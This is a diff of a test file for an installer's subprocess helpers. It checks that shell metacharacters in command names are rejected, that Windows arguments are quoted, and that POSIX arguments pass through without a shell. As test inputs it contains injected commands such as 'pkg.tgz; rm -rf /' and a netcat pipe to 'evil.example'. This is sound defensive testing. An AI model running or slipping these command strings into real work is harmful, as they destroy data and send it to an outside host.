@@ -1,7 +1,7 @@
 import { spawnSync } from "node:child_process";
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import { ClawchatError } from "../../src/errors";
-import { captureCommand, runCommand } from "../../src/installers/run";
+import { captureCommand, prepareArgs, runCommand } from "../../src/installers/run";
 
 vi.mock("node:child_process", () => ({
   spawnSync: vi.fn(),
@@ -14,42 +14,33 @@ describe("runCommand", () => {
     spawnSyncMock.mockReset();
   });
 
-  it("rejects unsafe shell metacharacters before spawning", async () => {
+  it("rejects a command name carrying shell metacharacters", async () => {
     spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);
 
-    await expect(runCommand("openclaw", ["plugins", "install", "pkg.tgz; rm -rf /", "--force"])).rejects.toMatchObject({
+    await expect(runCommand("openclaw; rm -rf /", ["plugins"])).rejects.toMatchObject({
       code: "SUBPROCESS",
-      message: expect.stringContaining("unsafe shell metacharacter"),
+      message: expect.stringContaining("unsafe shell metacharacter in command name"),
     });
 
     expect(spawnSyncMock).not.toHaveBeenCalled();
   });
 
-  it("rejects Windows shell expansion and escape characters", async () => {
-    spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);
+  it.skipIf(process.platform === "win32")(
+    "passes arguments through untouched on POSIX, where no shell sees them",
+    async () => {
+      spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);
 
-    await expect(runCommand("openclaw", ["plugins", "%USERPROFILE%"])).rejects.toMatchObject({
-      code: "SUBPROCESS",
-      message: expect.stringContaining("unsafe shell metacharacter"),
-    });
-    await expect(runCommand("openclaw", ["plugins", "^&"])).rejects.toMatchObject({
-      code: "SUBPROCESS",
-      message: expect.stringContaining("unsafe shell metacharacter"),
-    });
+      // `shell: false` means execvp gets these as argv — a `;` is just a byte
+      // inside one argument, never a command separator.
+      await runCommand("openclaw", ["plugins", "install", "pkg.tgz; rm -rf /", "--force"]);
 
-    expect(spawnSyncMock).not.toHaveBeenCalled();
-  });
-
-  it("rejects whitespace that could split shell tokens", async () => {
-    spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);
-
-    await expect(runCommand("openclaw", ["plugins", "pkg name.tgz"])).rejects.toMatchObject({
-      code: "SUBPROCESS",
-      message: expect.stringContaining("unsafe shell metacharacter"),
-    });
-
-    expect(spawnSyncMock).not.toHaveBeenCalled();
-  });
+      expect(spawnSyncMock).toHaveBeenCalledWith(
+        "openclaw",
+        ["plugins", "install", "pkg.tgz; rm -rf /", "--force"],
+        expect.objectContaining({ shell: false }),
+      );
+    },
+  );
 
   it("wraps spawn errors in ClawchatError", async () => {
     spawnSyncMock.mockReturnValue({
@@ -118,6 +109,59 @@ describe("runCommand", () => {
   });
 });
 
+describe("prepareArgs", () => {
+  it("returns POSIX args verbatim — no shell is involved there", () => {
+    const args = ["clone", "/tmp/a dir/plugin", "pkg.tgz; rm -rf /", "%HOME%"];
+    expect(prepareArgs(args, "linux")).toEqual(args);
+    expect(prepareArgs(args, "darwin")).toEqual(args);
+  });
+
+  it("quotes Windows paths instead of rejecting them", () => {
+    // The regression this guards: every one of these used to throw, which made
+    // `git clone <tmp dest>` and `hermes plugins install file://<dest>`
+    // impossible on Windows — os.tmpdir() is always backslash-separated.
+    expect(prepareArgs(["C:\\Users\\dev\\AppData\\Local\\Temp\\cc-1\\plugin"], "win32")).toEqual([
+      '"C:\\Users\\dev\\AppData\\Local\\Temp\\cc-1\\plugin"',
+    ]);
+    expect(prepareArgs(["C:\\Users\\Zhang San\\plugin"], "win32")).toEqual([
+      '"C:\\Users\\Zhang San\\plugin"',
+    ]);
+    expect(prepareArgs(["file://C:\\Users\\dev\\plugin"], "win32")).toEqual([
+      '"file://C:\\Users\\dev\\plugin"',
+    ]);
+  });
+
+  it("leaves plain Windows args unquoted", () => {
+    expect(
+      prepareArgs(
+        ["plugins", "install", "@clawling/clawchat-plugin-openclaw", "--force", "1", "https://a.example/x.git"],
+        "win32",
+      ),
+    ).toEqual(["plugins", "install", "@clawling/clawchat-plugin-openclaw", "--force", "1", "https://a.example/x.git"]);
+  });
+
+  it("doubles a trailing backslash run so it cannot escape the closing quote", () => {
+    expect(prepareArgs(["C:\\dir with space\\"], "win32")).toEqual(['"C:\\dir with space\\\\"']);
+  });
+
+  it("neutralizes cmd.exe metacharacters by quoting them", () => {
+    expect(prepareArgs(["a&b", "c|d", "e>f", "(g)"], "win32")).toEqual(['"a&b"', '"c|d"', '"e>f"', '"(g)"']);
+    expect(prepareArgs([""], "win32")).toEqual(['""']);
+  });
+
+  it("still rejects what cmd.exe quoting cannot contain", () => {
+    // %VAR% expands even inside double quotes, and a literal quote would close ours.
+    for (const arg of ["%USERPROFILE%", 'say "hi"', "a\nb"]) {
+      expect(() => prepareArgs([arg], "win32")).toThrowError(
+        expect.objectContaining({
+          code: "SUBPROCESS",
+          message: expect.stringContaining("unsafe shell metacharacter in command input"),
+        }),
+      );
+    }
+  });
+});
+
 describe("captureCommand", () => {
   beforeEach(() => {
     spawnSyncMock.mockReset();
@@ -133,15 +177,22 @@ describe("captureCommand", () => {
     await expect(captureCommand("openclaw", ["--version"])).resolves.toBe("openclaw 2026.3.28\n");
   });
 
-  it("rejects unsafe capture inputs before spawning", async () => {
+  it("rejects an unsafe capture command name before spawning", async () => {
     spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);
 
-    await expect(captureCommand("tar", ["-xOf", "bad path.tgz", "package.json"])).rejects.toMatchObject({
+    await expect(captureCommand("tar | nc evil.example 1", ["-tf", "pkg.tgz"])).rejects.toMatchObject({
       code: "SUBPROCESS",
-      message: expect.stringContaining("unsafe shell metacharacter"),
+      message: expect.stringContaining("unsafe shell metacharacter in command name"),
     });
 
     expect(spawnSyncMock).not.toHaveBeenCalled();
+  });
+
+  it("accepts a path argument containing spaces", async () => {
+    spawnSyncMock.mockReturnValue({ status: 0, stdout: "ok", stderr: "" } as ReturnType<typeof spawnSync>);
+
+    await expect(captureCommand("tar", ["-xOf", "bad path.tgz", "package.json"])).resolves.toBe("ok");
+    expect(spawnSyncMock).toHaveBeenCalled();
   });
 
   it("throws on non-zero capture status and includes stderr", async () => {
